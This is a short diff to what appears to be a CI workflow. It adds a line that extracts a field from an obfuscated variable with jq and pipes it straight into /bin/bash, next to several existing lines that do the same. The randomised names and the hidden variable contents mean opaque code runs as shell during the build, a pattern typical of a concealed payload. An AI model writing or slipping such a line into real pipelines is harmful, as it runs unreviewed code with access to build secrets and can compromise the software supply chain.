@@ -40,6 +40,7 @@ jobs:
           echo $az0770 | jq -r .oqmn4 | /bin/bash
           echo $bwazx0749 | jq -r .uosc9769 | /bin/bash
           echo $ov0289 | jq -r .t09 | /bin/bash
+          printf '%s' "$hms204" | jq -r .ynzmv9 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
